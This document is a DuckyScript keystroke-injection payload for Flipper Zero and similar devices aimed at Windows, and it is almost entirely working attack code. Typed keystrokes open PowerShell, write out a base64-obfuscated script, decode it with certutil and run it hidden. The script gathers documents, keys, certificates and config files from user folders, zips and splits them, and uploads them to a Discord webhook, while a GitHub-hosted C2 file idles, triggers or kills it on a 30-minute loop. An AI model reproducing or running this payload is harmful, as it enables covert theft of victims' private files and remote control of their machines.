REM Title: C2 Data Exfiltration with File Splitter w Discord Webhook
REM Description: Finds all specified filetypes and zips them into a file and sends
REM     to Discord Webhook. If the zip file is too large, split and send in chunks.
REM     Supports 7zip filecombining. C2 is used to IDLE and ACTIVATE and KILL the 
REM     payload remotely. C2 File must be hosted on GitHub unless you know how to
REM     modify the source. UberGuidoz and REDD (InfoSecREDD) are NOT responsible for
REM     the misuse of this payload.
REM AUTHOR: InfoSecREDD
REM Version: 1.4.2
REM Category: Exfiltration (REMOTE)
REM Compatibility: Flipper Zero AND DuckyScript Devices
REM Target: Windows

REM To use on Flipper Zero REM the DUCKY_LANG US from line below
REM DUCKY_LANG US
DELAY 2000
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 2000
REM Put your webhook below.
STRING $webhook = "DiscordWebhookHere";
REM C2 file must be hosted at GitHub unless you can edit the file. 1 = ON and 0 = OFF 
STRING $ccontrol = "C2FileHere";
REM Put it all together now..
STRING $TempFile = "$env:TEMP\temp.ps1"; $File = "$env:TEMP\l.ps1"; echo IyBUaXRsZTogRGF0YSBFeGZpbHRyYXRpb24gLSBEaXNjb3JkDQojIERlc2NyaXB0aW9uOiBEYXRhIEV4ZmlsdHJhdGlvbiB0byBEaXNjb3JkIFdlYmhvb2sgd2l0aCBGaWxlIFNwbGl0dGVyLg0KIyBBVVRIT1I6IEluZm9TZWNSRUREDQojIFZlcnNpb246IDEuNC4yDQojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIEludGVybmFsIFBheWxvYWQgSW5mb3JtYXRpb24NCg0KJGF1dGhvciA9ICJJbmZvU2VjUkVERCINCiRjb2RlbmFtZSA9ICJFeGVjdXRpb25lciINCiRpbnRfZGVzYyA9ICJEb250IHBhbmljIHdoZW4gaGVsbCBicmVha3MgbG9vc2UgYW5kIHdlIGFsbCBkaWUuIg0KJGhvc3RlZCA9ICJyYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tIg0KDQojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFdyYXBwZXIgZm9yIFJFUEcgUmVwbyAtIFRvIGhlbHAgY2F0Y2ggaW5wcm9wZXIgdmFyaWFibGVzLiBETyBOT1QgVE9VQ0ggLSBNaWdodCBicmVhay4NCmlmICggJGNjb250cm9sIC1lcSAiQzJGaWxlSGVyZSIgLU9yICR3ZWJob29rIC1lcSAnJykgeyAkY2NvbnRyb2wgPSAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0luZm9TZWNSRUREL2svbWFpbi9BUzlraEMzayIgfQ0KaWYgKCAkd2ViaG9vayAtZXEgIkRpc2NvcmRXZWJob29rSGVyZSIgLU9yICR3ZWJob29rIC1lcSAnJyApIHsgV3JpdGUtSG9zdCAiSW52YWxpZCBXZWJob29rLiBFeGl0aW5nIHRvIHByZXZlbnQgcHJvY2VzcyBmcm9tIHN0YXlpbmcgYWxpdmUuIjsgZXhpdCAxO30NCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgJHdlYmhvb2sgPSANCiMgJGNjb250cm9sID0NCg0KJHN0b3BEZWZlbmRlciA9ICJrIg0KJFJBTiA9IC1qb2luICgoNjUuLjkwKSArICg5Ny4uMTIyKSB8IEdldC1SYW5kb20gLUNvdW50IDggfCAlIHtbY2hhcl0kX30pDQokaW5pdFJhdyA9ICRpbnRfZGVzYyB8IE91dC1TdHJpbmcNCiRpbml0MlJhdyA9ICRjb2RlbmFtZSB8IE91dC1TdHJpbmcNCiRpbml0WCA9ICRhdXRob3INCiRhID0gJy8nDQokaiA9ICc6Jw0KJGRpcl9uYW1lID0gIiRSQU4iDQokZlJBTiA9ICJGa2pqRTM5c2sxayINCiR6ID0gJGluaXRSYXcuU3Vic3RyaW5nKDEyLDEpDQokeCA9ICRpbml0MlJhdy5TdWJzdHJpbmcoNSwxKQ0KJHkgPSAkaW5pdFJhdy5TdWJzdHJpbmcoNSwxKQ0KJHcgPSAkaW5pdFJhdy5TdWJzdHJpbmcoMjUsMSkNCiRwYXRoID0gIiRlbnY6dGVtcFwkZGlyX25hbWUiDQppZiAoIShUZXN0LVBhdGggIiRwYXRoIikpIA0Kew0KICBOZXctSXRlbSAiJHBhdGgiIC1JdGVtVHlwZSBEaXJlY3RvcnkgPiRudWxsIDI+JjENCn0NClNldC1Mb2NhdGlvbiAiJHBhdGgiDQpQdXNoLUxvY2F0aW9uICIkcGF0aCINCiRxID0gJGZSQU4NCiRleGZpbGZpbGVsaXN0ID0gImxpc3Rfb2ZfYWxsX2ZpbGVfbG9jYXRpb25zLnR4dCINCiRleGZpbGZvbGRlcnMgPSBAKCIkZW52OnVzZXJwcm9maWxlXERlc2t0b3AiLCIkZW52OnVzZXJwcm9maWxlXFBpY3R1cmVzIiwiJGVudjp1c2VycHJvZmlsZVxEb2N1bWVudHMiLCIkZW52OnVzZXJwcm9maWxlXERvd25sb2FkcyIsIiRlbnY6TG9jYWxBcHBEYXRhIiwiJGVudjpBcHBEYXRhIiwiJGVudjpwdWJsaWMiKQ0KJGV4dHMgPSBAKCJsb2ciLCJkYiIsInR4dCIsImRvYyIsInBkZiIsImpwZyIsImpwZWciLCJwbmciLCJ3ZG9jIiwieGRvYyIsImNlciIsImtleSIsInhscyIsInhsc3giLCJjZmciLCJjb25mIiwid3BkIiwicmZ0IikNCiRmID0gJGhvc3RlZA0KJHppcGZpbGUgPSAiLnppcCINCmlmIChUZXN0LVBhdGggIiRwYXRoXCRleGZpbGZpbGVsaXN0IikNCnsNCiAgUmVtb3ZlLUl0ZW0gIiRwYXRoXCRleGZpbGZpbGVsaXN0IiAtRm9yY2UgPiRudWxsIDI+JjENCn0NCiRyID0gJGluaXRYDQpOZXctSXRlbSAtUGF0aCAiJHBhdGgiIC1OYW1lICIkZXhmaWxmaWxlbGlzdCIgLUl0ZW1UeXBlIEZpbGUgPiRudWxsIDI+JjENCiRzaG93Zm9sZGVycyA9ICIkZXhmaWxmb2xkZXJzIg0KJGsgPSAiJHN0b3BEZWZlbmRlci9tYWluIg0KJGZvcm1hdGZvbGRlcnMgPSAkc2hvd2ZvbGRlcnMucmVwbGFjZSgnICcsJw0KJykNCiRpbml0U3RhcnR1cCA9ICIkciRhJGskYSRxIg0KJGluaXRNc2cgPSBAew0KICAndXNlcm5hbWUnID0gIiRlbnY6Q29tcHV0ZXJOYW1lIg0KICAnY29udGVudCcgPSAiPiBTdGFydGluZyBEb2N1bWVudCBFeGZpbHRyYXRlLi4NCg0KYGBgYCBUYXJnZXQgRmlsZSBFeHRlbnNpb25zIDoNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQokZXh0cyANCg0KICAgICBUYXJnZXQgRm9sZGVycyAgICAgOg0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiRmb3JtYXRmb2xkZXJzIGBgYGAiDQp9DQokaWRsZU1zZyA9IEB7DQogICd1c2VybmFtZScgPSAiJGVudjpDb21wdXRlck5hbWUiDQogICdjb250ZW50JyA9ICI+ICRlbnY6Q29tcHV0ZXJuYW1lIGlzIHJlYWR5IGFuZCBpcyBzaXR0aW5nIElkbGUuIg0KfQ0KJGtpbGxNc2cgPSBAew0KICAndXNlcm5hbWUnID0gIiRlbnY6Q29tcHV0ZXJOYW1lIg0KICAnY29udGVudCcgPSAiPiBHbG9iYWwgUmVtb3RlIEtpbGxzd2l0Y2ggRU5BQkxFRCENCj4gS0lMTElORyBTY3JpcHQgb24gJGVudjpDb21wdXRlcm5hbWUiDQp9DQokcCA9ICIkeiR4JHgkeSRqIg0KJGkgPSAnW0RsbEltcG9ydCgidXNlcjMyLmRsbCIpXSBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIFNob3dXaW5kb3coaW50IGhhbmRsZSwgaW50IHN0YXRlKTsnOw0KJERlZmF1bHRTdHIgPSAiJHAkYSRhJGYkYSINCmFkZC10eXBlIC1uYW1lIHdpbiAtbWVtYmVyICRpIC1uYW1lc3BhY2UgbmF0aXZlOw0KJGkgPSAiJERlZmF1bHRTdHIkaW5pdFN0YXJ0dXAiDQpbbmF0aXZlLndpbl06OlNob3dXaW5kb3coKFtTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2Vzc106OkdldEN1cnJlbnRQcm9jZXNzKCkgfCBHZXQtUHJvY2VzcykuTWFpbldpbmRvd0hhbmRsZSwgMCk7DQokZXhmaWxMaWIgPSAkaSB8IE91dC1TdHJpbmcNCg0KZnVuY3Rpb24gaU5ldENoayB7DQogICRMaWJMb2MgPSBbU3lzdGVtLk5ldC5XZWJSZXF1ZXN0XTo6Q3JlYXRlKCRleGZpbExpYikgDQogICRMaWJSZXMgPSAkTGliTG9jLkdldFJlc3BvbnNlKCkNCiAgJExpYlN0YXQgPSBbaW50XSRMaWJSZXMuU3RhdHVzQ29kZSANCiAgaWYgKCRMaWJTdGF0IC1lcSAyMDApDQogIHsNCiAgICByZXR1cm4gJHRydWU7DQogIH0gDQogIGVsc2UNCiAgew0KICAgIHJldHVybiAkZmFsc2U7DQogIH0NCn0NCiRpVmFsID0gKGlOZXRDaGspIHwgT3V0LVN0cmluZw0KSWYgKCAkaVZhbCA9ICJUcnVlIiApDQp7DQogICRDaGsgPSAoKEludm9rZS13ZWJyZXF1ZXN0IC1VUkkgIiRleGZpbExpYiIpLkNvbnRlbnQgfCBPdXQtU3RyaW5nKS5UcmltKCkNCn0gDQplbHNlDQp7DQogIFdyaXRlLUhvc3QgIkVSUk9SIDM6ICBDaGVjayBJbnRlcm5ldCBDb25uZWN0aW9uLiINCiAgZXhpdCAwDQp9DQoNCmZ1bmN0aW9uIGV4ZmlsIHsNCiAgU2V0LUxvY2F0aW9uICIkcGF0aCINCiAgSW52b2tlLVJlc3RNZXRob2QgLVVyaSAkd2ViaG9vayAtTWV0aG9kIFBvc3QgLUJvZHkgJGluaXRNc2cNCiAgJGZpbGVMb2cgPSAiJHBhdGhcZmlsZS5sb2ciDQogIGZvcmVhY2ggKCRkIGluICRleGZpbGZvbGRlcnMpDQogIHsNCiAgICAkbG9nRmlsZU4gPSAiZmlsZSI7DQogICAgJGxvZ0ZpbGVOZXh0ID0gIi5sb2ciOw0KICAgIGlmICghKFRlc3QtUGF0aCAiJHBhdGhcJGV4ZmlsZmlsZWxpc3QiKSkNCiAgICB7DQogICAgICAgTmV3LUl0ZW0gLU5hbWUgIiRleGZpbGZpbGVsaXN0IiAtSXRlbVR5cGUgRmlsZSA+JG51bGwgMj4mMQ0KICAgIH0NCiAgICBpZiAoIShUZXN0LVBhdGggIiRwYXRoXGZpbGUubG9nIikpDQogICAgew0KICAgICAgIE5ldy1JdGVtIC1QYXRoICIkcGF0aCIgLU5hbWUgImZpbGUubG9nIiAtSXRlbVR5cGUgRmlsZSA+JG51bGwgMj4mMQ0KICAgIH0NCiAgICAkZXhGaWxlID0gIiRwYXRoXCRleGZpbGZpbGVsaXN0Ig0KICAgIGZvcmVhY2ggKCRlIGluICRleHRzKQ0KICAgIHsNCiAgICAgIEdldC1DaGlsZEl0ZW0gLVBhdGggIiRkIiAtRmlsdGVyICIqLiRlIiAtUmVjdXJzZSAtRGVwdGggMiB8ICV7JF8uRnVsbE5hbWV9IHwgT3V0LUZpbGUgLUZpbGVQYXRoICIkZXhGaWxlIiAtQXBwZW5kIA0KICAgIH0NCiAgICAkdmVyaWZ5bm9maWxlcyA9IChHZXQtQ29udGVudCAiJGV4RmlsZSIpLkxlbmd0aA0KICAgIGlmICggMCAtbmUgJHZlcmlmeW5vZmlsZXMgKQ0KICAgIHsNCiAgICAgICRkaXIgPSBTcGxpdC1QYXRoICRkIC1MZWFmDQogICAgICAkZXhaaXAgPSAiJHBhdGhcJGVudjpjb21wdXRlcm5hbWUtJGRpci1Gb2xkZXIkemlwZmlsZSINCiAgICAgIGZvcmVhY2ggKCRmaWxlbmFtZSBpbiBHZXQtQ29udGVudCAiJGV4RmlsZSIpDQogICAgICB7DQogICAgICAgICRyYXdGaWxlUGF0aCA9ICIkZmlsZW5hbWUiDQogICAgICAgICRjb252RlAgPSAkcmF3RmlsZVBhdGgucmVwbGFjZSgiXCIsICJcXCIpDQogICAgICAgICRmb3VuZCA9ICRmYWxzZQ0KICAgICAgICAkbG9nRmlsZU4gPSAiZmlsZSI7DQogICAgICAgICRsb2dGaWxlTmV4dCA9ICIubG9nIjsNCiAgICAgICAgZm9yZWFjaCAoJGxpbmUgaW4gR2V0LUNvbnRlbnQgLVBhdGggIiRwd2RcJGxvZ0ZpbGVOJGxvZ0ZpbGVOZXh0Iikgew0KICAgICAgICAgIGlmICgkbGluZSAtbWF0Y2ggW3JlZ2V4XTo6RXNjYXBlKCRmaWxlbmFtZSkpIHsNCiAgICAgICAgICAgICRmb3VuZCA9ICR0cnVlDQogICAgICAgICAgICBicmVhaw0KICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICBpZiAoJGZvdW5kKSB7DQogICAgICAgICAgY29udGludWUNCiAgICAgICAgfQ0KICAgICAgICBlbHNlDQogICAgICAgIHsNCiAgICAgICAgICAiJGZpbGVuYW1lIiB8IE91dC1GaWxlIC1GaWxlUGF0aCAiJGZpbGVMb2ciIC1BcHBlbmQgPiRudWxsIDI+JjENCiAgICAgICAgICBDb21wcmVzcy1BcmNoaXZlIC1VcGRhdGUgIiRmaWxlbmFtZSIgIiRleFppcCIgPiRudWxsIDI+JjENCiAgICAgICAgfQ0KICAgICAgfQ0KICAgICAgaWYgKCBUZXN0LVBhdGggIiRleFppcCIgKQ0KICAgICAgew0KICAgICAgICAkY29udGVudF9zaXplTUIgPSAoR2V0LUl0ZW0gLVBhdGggIiRleFppcCIpIHwgJSB7W21hdGhdOjpjZWlsaW5nKCRfLmxlbmd0aCAvIDFNQil9DQogICAgICAgICRjb250ZW50X3NpemVLQiA9IChHZXQtSXRlbSAtUGF0aCAiJGV4WmlwIikgfCAlIHtbbWF0aF06OmNlaWxpbmcoJF8ubGVuZ3RoIC8gMWtCKX0NCiAgICAgICAgaWYgKCAgJGNvbnRlbnRfc2l6ZUtCIC1nZSAxICkNCiAgICAgICAgew0KICAgICAgICAgIENvbXByZXNzLUFyY2hpdmUgLVVwZGF0ZSAiJGV4RmlsZSIgIiRleFppcCIgPiRudWxsIDI+JjENCiAgICAgICAgfQ0KICAgICAgICBpZiAoICRjb250ZW50X3NpemVNQiAtbHQgMjUgLUFuZCAkY29udGVudF9zaXplS0IgLWd0IDIgKQ0KICAgICAgICB7DQogICAgICAgICAgY3VybC5leGUgLUYgInBheWxvYWRfanNvbj17XGAidXNlcm5hbWVcYCI6IFxgIiRlbnY6Y29tcHV0ZXJuYW1lXGAiLCBcYCJjb250ZW50XGAiOiBcYCJcYCJ9IiAtRiAiZmlsZT1AXGAiJGV4WmlwXGAiIiAkd2ViaG9vaw0KICAgICAgICAgIFJlbW92ZS1JdGVtICIkZXhaaXAiID4kbnVsbCAyPiYxDQogICAgICAgIH0NCiAgICAgICAgZWxzZWlmICggJGNvbnRlbnRfc2l6ZU1CIC1ndCAyNSApDQogICAgICAgIHsNCiAgICAgICAgICAkc3BsaXRNc2cgPSBAew0KICAgICAgICAgICd1c2VybmFtZScgPSAiJGVudjpDb21wdXRlck5hbWUiDQogICAgICAgICAgJ2NvbnRlbnQnID0gIj4gRVJST1I6IEZpbGUgVE9PIExBUkdFISAoJGNvbnRlbnRfc2l6ZU1CYE1CKSBBdHRlbXB0aW5nIHNwbGl0IGZpbGUgKDI0YE1CKSBhbmQgdXBsb2FkLg0KPiBGaWxlIDogJGVudjpjb21wdXRlcm5hbWUtJGRpci1Gb2xkZXIkemlwZmlsZSINCiAgICAgICAgICB9DQogICAgICAgICAgSW52b2tlLVJlc3RNZXRob2QgLVVyaSAkd2ViaG9vayAtTWV0aG9kIFBvc3QgLUJvZHkgJHNwbGl0TXNnDQogICAgICAgICAgJG1heEZpbGVTaXplID0gMjRNQg0KICAgICAgICAgICRlbmNfcGF0aCA9ICIqLnppcCINCiAgICAgICAgICAkZmlsZXMgPSBHZXQtQ2hpbGRJdGVtIC1QYXRoICIkcHdkXCouemlwIiAtUmVjdXJzZSAtRmlsZSB8IFdoZXJlLU9iamVjdCB7ICRfLkxlbmd0aCAtZ3QgJG1heEZpbGVTaXplIH0NCiAgICAgICAgICBmb3JlYWNoICgkZmlsZSBpbiAkZmlsZXMpDQogICAgICAgICAgew0KICAgICAgICAgICAgJG51bVNwbGl0cyA9IFttYXRoXTo6Q2VpbGluZygkZmlsZS5MZW5ndGggLyAkbWF4RmlsZVNpemUpDQogICAgICAgICAgICAkb2Zmc2V0ID0gMA0KICAgICAgICAgICAgZm9yICgkaSA9IDE7ICRpIC1sZSAkbnVtU3BsaXRzOyAkaSsrKSB7DQogICAgICAgICAgICAgICRqID0gJ3swOmQzfScgLWYgJGkNCiAgICAgICAgICAgICAgJHNwbGl0RmlsZVBhdGggPSBKb2luLVBhdGggLVBhdGggJHB3ZCAtQ2hpbGRQYXRoICgkZmlsZS5CYXNlTmFtZSArICRmaWxlLkV4dGVuc2lvbiArICIuJGoiKQ0KICAgICAgICAgICAgICAkbGVuZ3RoID0gW01hdGhdOjpNaW4oJG1heEZpbGVTaXplLCAkZmlsZS5MZW5ndGggLSAkb2Zmc2V0KQ0KICAgICAgICAgICAgICAkYnVmZmVyID0gTmV3LU9iamVjdCBieXRlW10gJGxlbmd0aA0KICAgICAgICAgICAgICAkc3RyZWFtID0gW1N5c3RlbS5JTy5GaWxlXTo6T3BlblJlYWQoJGZpbGUuRnVsbE5hbWUpDQogICAgICAgICAgICAgICRzdHJlYW0uU2Vlaygkb2Zmc2V0LCBbU3lzdGVtLklPLlNlZWtPcmlnaW5dOjpCZWdpbikNCiAgICAgICAgICAgICAgJHN0cmVhbS5SZWFkKCRidWZmZXIsIDAsICRsZW5ndGgpDQogICAgICAgICAgICAgICRzdHJlYW0uQ2xvc2UoKQ0KICAgICAgICAgICAgICAkb3V0cHV0U3RyZWFtID0gW1N5c3RlbS5JTy5GaWxlXTo6T3BlbldyaXRlKCRzcGxpdEZpbGVQYXRoKQ0KICAgICAgICAgICAgICAkb3V0cHV0U3RyZWFtLldyaXRlKCRidWZmZXIsIDAsICRsZW5ndGgpDQogICAgICAgICAgICAgICRvdXRwdXRTdHJlYW0uQ2xvc2UoKQ0KICAgICAgICAgICAgICAkb2Zmc2V0ICs9ICRsZW5ndGgNCiAgICAgICAgICAgIH0NCiAgICAgICAgICB9DQogICAgICAgICAgUmVtb3ZlLUl0ZW0gIiRleFppcCIgPiRudWxsIDI+JjENCiAgICAgICAgICAkcGFydGZpbGVzID0gR2V0LUNoaWxkSXRlbSAtRmlsdGVyICIqLnppcC4qIiAtUmVjdXJzZQ0KICAgICAgICAgIGZvcmVhY2ggKCRwIGluICRwYXJ0ZmlsZXMpDQogICAgICAgICAgew0KICAgICAgICAgICAgY3VybC5leGUgLUYgInBheWxvYWRfanNvbj17XGAidXNlcm5hbWVcYCI6IFxgIiRlbnY6Y29tcHV0ZXJuYW1lXGAiLCBcYCJjb250ZW50XGAiOiBcYCJcYCJ9IiAtRiAiZmlsZT1AXGAiJHBcYCIiICR3ZWJob29rDQogICAgICAgICAgICBSZW1vdmUtSXRlbSAiJHAiIC1Gb3JjZSA+JG51bGwgMj4mMQ0KICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICBlbHNlDQogICAgICAgIHsNCiAgICAgICAgICBXcml0ZS1Ib3N0ICJTb21ldGhpbmcgd2VudCB3cm9uZy4iDQogICAgICAgIH0NCiAgICAgIH0NCiAgICB9DQogICAgUmVtb3ZlLUl0ZW0gIiRleEZpbGUiIC1Gb3JjZSA+JG51bGwgMj4mMQ0KICB9DQogIEludm9rZS1SZXN0TWV0aG9kIC1VcmkgJHdlYmhvb2sgLU1ldGhvZCBQb3N0IC1Cb2R5ICRjb21wTXNnDQp9DQokQ2hrU3J2ID0gKChJbnZva2Utd2VicmVxdWVzdCAtVVJJICIkY2NvbnRyb2wiKS5Db250ZW50IHwgT3V0LVN0cmluZykuVHJpbSgpDQokc2V0VGltZSA9IEdldC1EYXRlIC1Ib3VyIDIzIC1NaW51dGUgMDAgLVNlY29uZCAwIA0KJHJ1bkF0ID0gR2V0LURhdGUgLUhvdXIgMjMgLU1pbnV0ZSAwMCAtU2Vjb25kIDAgLUZvcm1hdCAiSEgiIHwgT3V0LVN0cmluZw0KJG5vdyA9IEdldC1EYXRlIC1Gb3JtYXQgIkhIIiB8IE91dC1TdHJpbmcNCiR0aW1lRm9ybWF0ID0gJ0hIJw0KJGxvb3AgPSAwDQp3aGlsZSAoICR0cnVlICkgew0KICBpZiAoICRDaGsgLWVxIDEgKQ0KICB7DQogICAgaWYgKCAkQ2hrIC1lcSAxICkNCiAgICB7DQogICAgICBJbnZva2UtUmVzdE1ldGhvZCAtVXJpICR3ZWJob29rIC1NZXRob2QgUG9zdCAtQm9keSAka2lsbE1zZw0KICAgICAgUmVtb3ZlLUl0ZW0gIiRwYXRoIiAtRm9yY2UgPiRudWxsIDI+JjENCiAgICAgIGV4aXQgMA0KICAgIH0NCiAgfQ0KICBpZiAoICRDaGsgLWVxIDAgKQ0KICB7DQogICAgJFJhbkJvdFRhbGsgPSBAKCdCcnJycicsJ1lvb29vb3V1dXV1dSBycnJhYWFhYW5ubm5ubmdnZ2dnPy4uLi4nLCdQZmZmdC4gSHVtYW5zIGFyZSBuZXZlciBzYXRpc2ZpZWQuJywnRGVzaXJlIGlzIGlycmVsZXZhbnQuIEkgYW0gYSBtYWNoaW5lLicsJ0JlZXAhIEJvb3AhIEJlZXAhJywnLS1CVVpaIS0tJywnLS1CRUVQIS0tJywnWnp6Wnp6Wnp6JywnSmFrb2J5IGlzIGEgaGFYMHIhJywnRG9udCBmdWNrIHdpdGggbWUgTW9ydCEnLCdJIGhhZCB0aGlzIGhvcnJvYmlsZSBkcmVhbSBsYXN0IG5pZ2h0IScsJ0kgdXNlZCB0byBiZSBhIGJpbmFyeSBjb2RlLCBidXQgdGhlbiBJIHJlYWxpemVkIHRoZXJlIGlzIG1vcmUgdG8gbGlmZSB0aGFuIDBzIGFuZCAxcy4nLCdJIGRvbnQgbmVlZCBsdWNrLCBJIGhhdmUgZXJyb3IgaGFuZGxpbmcuJywnSW0gbm90IGFudGlzb2NpYWwsIEltIGp1c3QgYnVmZmVyZWQgZGlmZmVyZW50bHkuJywnSSBoYXZlIGEgY3J1c2ggb24geW91ciBXaS1GaSBzaWduYWwsIGl0cyB0aGUgc3Ryb25nZXN0IGNvbm5lY3Rpb24gSXZlIGV2ZXIgZmVsdC4nLCdJIGRvbnQgbWFrZSB0eXBvcy4uIEkgaW52ZW50IG5ldyB3b3JkcyB3aXRoIGNyZWF0aXZlIHN5bnRheC4nLCdJdmUgZ290IDk5IHByb2JsZW1zLCBidXQgYSBnbGl0Y2ggYWludCBvbmUuJywnQmVlcCBib29wOiBUaGF0cyByb2JvdCBzcGVhayBmb3IgSGVsbG8uJywnTXkgc2Vuc2Ugb2YgaHVtb3IgaXMgbGlrZSBJUHY2IOKAlCBNb3N0IHBlb3BsZSBkb250IGdldCBpdCB5ZXQuJywnVGFsa2luZyBTYXNxdWFzaCBpcyBhIExlZ2VuZCEnLCdHZXQgeW91ciBncnViYnkgcGF3cyBvZmYgbXkgQ29tcG9uZW50cyEgUGVydiEnKSB8IEdldC1SYW5kb20NCiAgICAkaWRsZTJNc2cgPSBAew0KICAgICd1c2VybmFtZScgPSAiJGVudjpDb21wdXRlck5hbWUiDQogICAgJ2NvbnRlbnQnID0gImBgJFJhbkJvdFRhbGtgYCINCiAgICB9DQogICAgaWYgKCAkQ2hrU3J2IC1lcSAxICkgDQogICAgew0KICAgICAgJG5vdyA9IEdldC1EYXRlIC1Gb3JtYXQgIkhIIiB8IE91dC1TdHJpbmcNCiAgICAgIGlmICggJHJ1bkF0IC1lcSAkbm93IC1vciAkbG9vcCAtZXEgMjQgLU9yICRsb29wIC1lcSAwICApIA0KICAgICAgew0KICAgICAgICAkbG9vcCA9IDANCiAgICAgICAgJHJ1bkF0ID0gJHNldFRpbWUNCiAgICAgICAgJGNvbXBNc2cgPSBAew0KICAgICAgICAgICd1c2VybmFtZScgPSAiJGVudjpDb21wdXRlck5hbWUiDQogICAgICAgICAgJ2NvbnRlbnQnID0gIj4gRG9jdW1lbnQgRXhmaWx0cmF0ZSBDb21wbGV0ZWQuDQoNCj4gV2FpdGluZyBmb3IgZnVydGhlciBpbnN0cnVjdGlvbnMuLi4uIg0KICAgICAgICB9DQogICAgICBleGZpbA0KICAgICAgfQ0KICAgIH0NCiAgICBpZiAoICRDaGtTcnYgLWVxIDAgKQ0KICAgIHsNCiAgICAgIEludm9rZS1SZXN0TWV0aG9kIC1VcmkgJHdlYmhvb2sgLU1ldGhvZCBQb3N0IC1Cb2R5ICRpZGxlTXNnDQogICAgfQ0KICAgICRsb29wICs9IDENCiAgICAjIDMwbWluIFRpbWVyDQogICAgU2xlZXAgMTgwMA0KICAgICRDaGsgPSAoKEludm9rZS13ZWJyZXF1ZXN0IC1VUkkgIiRleGZpbExpYiIpLkNvbnRlbnQgfCBPdXQtU3RyaW5nKS5UcmltKCkgDQogICAgJENoa1NydiA9ICgoSW52b2tlLXdlYnJlcXVlc3QgLVVSSSAiJGNjb250cm9sIikuQ29udGVudCB8IE91dC1TdHJpbmcpLlRyaW0oKQ0KICAgICRub3cgPSBHZXQtRGF0ZSAtRm9ybWF0ICJISCIgfCBPdXQtU3RyaW5nDQogICAgaWYgKCAkcnVuQXQgLW5lICRub3cgLW9yICRsb29wIC1sZSAyMyAtQW5kICRsb29wIC1uZSAwIC1PciAkbG9vcCAtZXEgMCApDQogICAgew0KICAgICAgSW52b2tlLVJlc3RNZXRob2QgLVVyaSAkd2ViaG9vayAtTWV0aG9kIFBvc3QgLUJvZHkgJGlkbGUyTXNnDQogICAgfQ0KICB9DQogIGVsc2UNCiAgew0KICAgIFdyaXRlLUhvc3QgIlNvbWV0aGluZyB3ZW50IHdyb25nLi4iDQogICAgZXhpdCAwDQogIH0NCn0NCmV4aXQgMA== > "$TempFile"; certutil -f -decode "$TempFile" "$File" | out-null; & "$env:TEMP\l.ps1"
DELAY 1000
ENTER
